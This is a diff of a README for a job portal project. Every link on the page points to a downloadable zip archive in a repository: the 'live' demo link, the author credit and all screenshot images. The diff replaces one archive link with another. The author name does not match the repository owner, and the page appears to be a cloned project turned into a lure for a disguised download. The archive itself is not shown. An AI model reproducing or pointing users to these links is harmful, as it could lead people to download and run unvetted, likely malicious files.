@@ -1,12 +1,12 @@
 ##### This App is Live and Running At the following
-#### https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip
+#### https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip
 adding my code
 
  - don't forget to leave a star ! :)
 
 ## Authors
 
-- [Abdullah Moiz](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+- [Abdullah Moiz](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 ## Features
 
@@ -73,45 +73,45 @@ MongoDB,
 ## Screen shots
 
 #### Loading Screen
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 #### Home Page 
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 #### search Job based on tags
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 
 
 #### login Page
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 #### Register Page
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 #### Forget Password 
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 #### Dashboard to trace Your Favorite Jobs and Jobs on which you have Applied 
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 #### Post Job
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 #### Your Posted Job
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 #### managing Applicant on your Job
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 #### View Job 
-![image](https://github.com/mwanzia-kathenge/Job-Portal/raw/refs/heads/main/public/Portal_Job_v1.8.zip)
+![image](https://raw.githubusercontent.com/mwanzia-kathenge/Job-Portal/main/pages/frontend/Job_Portal_v3.9-alpha.1.zip)
 
 
 
